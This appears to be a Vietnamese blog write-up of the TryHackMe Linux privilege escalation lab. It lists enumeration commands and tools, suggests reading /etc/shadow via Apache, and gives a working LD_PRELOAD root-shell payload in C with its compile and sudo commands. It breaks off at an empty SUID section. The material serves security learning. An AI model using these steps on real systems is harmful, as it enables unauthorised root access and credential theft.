---
title: "Linux Privilege Escalation"
date: "2025-02-13"
excerpt: "Linux Privilege Escalation - Tryhackme"
featured: "/images/linux_escape.webp"
---

## Step 1: Enumeration

Enumeration là bước đầu tiên bạn phải thực hiện một khi bạn có quyền truy cập vào bất kỳ hệ thống nào. 

`hostname`: trả về hostname của hệ thống đích => có thể chứa thông tin về hệ thống

`uname -a`: Đưa ra thông tin chi tiết về kernel của system

`/proc/version`: Chứa các thông tin về các tiến trình trên hệ thống mục tiêu. 

`/etc/issue`: Chứa thông tin về Hệ điều hành

`ps command`: Đưa ra các tiến trình đang chạy trên Linux bao gồm PID (process id), TTY (Terminal type used by the user), Time (Khoảng thời gian CPU được sử dụng bởi tiến trình), CMD (dòng lệnh hay câu lệnh thực thi đang chạy).

`ps -A`: Xem tất cả tiến trình đang chạy

`ps axjf`: Xem tiến trình dạng cây

`ps aux`: Tiến trình của toàn bộ users

`env`: Show các biến môi trường

`sudo -l`: Hệ thống mục tiêu được cấu hình để cho phép người dùng chạy 1 vài (hoặc tất cả) các lệnh với quyền __root__ => List các command có thể được user chạy với quyền __root__

`netstat`: Được sử dụng với 1 số options khác nhau để thu thập thông tin và các connections hiện có

__netstat -a__: show các ports đnag lắng nghe và các kết nối đã được thành lập.

__netstat -at__ hoặc __netstat -au__: hiện các giao thức TCP, UDP tương ứng.

__netstat -l__: các ports ở chế độ lắng nghe. Option -t: TCPP protocol

`find Command`: Tìm kiếm thông tin

__find . -name flag1.txt__: Tìm kiếm file flag1.txt ở thư mục hiện tại.

__find /home -name flag1.txt__: Tìm kiếm file flag1.txt ở thư mục /home.

__find / -type d -name config__: Tìm kiếm folder tên "config" ở "/"

__find / -type f -perm 0777__

__find / -perm a=x__: Tìm file thực thi

__find /home -user frank__: TÌm các file của người dùng "frank" trong folder /home

__find / -mtime 10__: Tìm các file mới được sửa đổi trong 10 ngày

__find / -atime 10__: Tìm các file mới được truy cập trong 10 ngày

__find / -cmin -60__: Tìm các file mới được sửa đổi trong 60 phút

__find / -amin -60__: Tìm các file mới được truy cập trong 60 phút

__find / -size +100M__

__-type f 2>/dev/null__: đưa ra output sạch, lỗi đưa vào /dev/null

Tìm kiếm các folder có thể ghi:

`find / -writable -type d 2>/dev/null`

`find / -perm -222 -type d 2>/dev/null`

`find / -perm -o w -type d 2>/dev/null`

`find / -name gcc*`

## Step 2: Automated Enumeration Tools

`LinPeas`: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

`LinEnum`: https://github.com/rebootuser/LinEnum

`LES (Linux Exploit Suggester)`: https://github.com/mzet-/linux-exploit-suggester

`Linux Smart Enumeration`: https://github.com/diego-treitos/linux-smart-enumeration

`Linux Priv Checker`: https://github.com/linted/linuxprivchecker

## Step 3: Privilege Escalation

### Kernel Exploits

Kernel trên Linux quản lý việc các thành phần như memory trên hệ thống và ứng dụng giao tiếp với nhau. Các chức năng này cần có quyền cụ thể => Khai thác thành công, có quyền __root__

__Khai thác Kernel__

- Nhận dạng version của kernel
- Tìm kiếm code exploit của version đó
- Chạy code

### Sudo

Lệnh __sudo__ cho phép người dùng chạy chương trình với quyền __root__. Trong 1 số trường hợp, admin có thể cho người dùng quyền __root__ khi thực hiện công việc gì đó. 

`sudo -l`: Hệ thống mục tiêu được cấu hình để cho phép người dùng chạy 1 vài (hoặc tất cả) các lệnh với quyền __root__ => List các command có thể được user chạy với quyền __root__

[gtfobins](https://gtfobins.github.io/): tài nguyên cung cấp thông tin cách chương trình có thể có quyền sudo có thể được sử dụng

__Leverage application functions__

Apache2 có option lựa chọn tệp cấu hình thay thế

![image](https://i.imgur.com/rNpbbL8.png)

=> Load file `/etc/shadow` luôn cũng được, sẽ ra dòng đầu tiên

__Leverage LD_PRELOAD__

Trên một số hệ thống, ta có thể thấy LD_PRELOAD env option

![image](https://i.imgur.com/gGstS69.png)

LD_PRELOAD là một chức năng cho phép bất kỳ chương trình nào sử dụng các thư viện được chia sẻ.

[Blog này](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) nói cho bạn về khả năng của LD_PRELOAD. Nếu option __env_keep__ được bật, ta có thể generate thư viện chung để mà được load và thực thi trước khi chương trình được chạy. LD_PRELOAD sẽ bị bỏ qua nếu ID người dùng thực khác với ID người dùng hiệu quả.

Các bước leo quyền với LD_PRELOAD:
- Check LD_PRELOAD với option env_keep
- Viết code C và compile về share object file (.so extension)
- Chạy chương trình với quyefn sudo và LD_PRELOAD trỏ tới file .so của ta

Code C:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Run program

```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

Result

![image](https://i.imgur.com/1YwARyZ.png)

### SUID

